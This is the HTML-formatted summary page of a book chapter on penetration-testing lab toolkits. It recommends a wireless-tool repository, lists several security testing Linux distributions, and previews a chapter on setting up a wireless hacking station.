<div class="book" title="Summary" id="1BRPS1-3ecab517ca6e4afbb3c20ab15f7b4d82"><div class="book"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_0"><a id="ch06lvl1sec39" class="calibre1"/>Summary</h1></div></div></div><p class="calibre9">In this chapter, you saw an overview of several popular security assessment toolkits used in numerous hacking tasks and projects along with examples of their utilization in the lab environment. You now have a brief understanding of their capabilities and a foundation for further learning.</p><p class="calibre9">Apart from that, there are a variety of other frameworks and standalone tools for almost every task that a penetration tester can encounter or imagine during a project. So, do not hesitate to explore new tools when you have time and try them in your lab—that is one of the reasons why you have built it.</p><p class="calibre9">There are a huge number of tools for wireless security analysis, yet sometimes it is hard to find one on the Internet when needed. But there is a repository that we recommend you to visit: <a class="calibre1" href="https://github.com/0x90">https://github.com/0x90</a>. It has a collection of a massive amount of software and scripts in one place.</p><p class="calibre9">When you are new to penetration testing and still not sure which tools should be in your arsenal, a good place to start is getting a preinstalled penetration testing distribution already containing most of the necessary tools. Normally, we use Kali Linux as a distribution, but there are a lot of others:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Parrot Security OS (<a class="calibre1" href="http://www.parrotsec.org/">http://www.parrotsec.org/</a>)</li><li class="listitem">Pentoo (<a class="calibre1" href="http://www.pentoo.ch/">http://www.pentoo.ch/</a>)</li><li class="listitem">Matriux (<a class="calibre1" href="http://www.matriux.com/">http://www.matriux.com/</a>)</li><li class="listitem">BackBox Linux (<a class="calibre1" href="https://www.backbox.org/">https://www.backbox.org/</a>)</li><li class="listitem">BlackArch Linux (<a class="calibre1" href="http://blackarch.org/">http://blackarch.org/</a>)</li><li class="listitem">Samurai Web Testing Framework (<a class="calibre1" href="http://samurai.inguardians.com/">http://samurai.inguardians.com/</a>)</li></ul></div><p class="calibre9">In the next chapter, we will help you prepare your wireless hacking station and show you which tools you have to deploy to be prepared for a wireless penetration test.</p></div></body></html>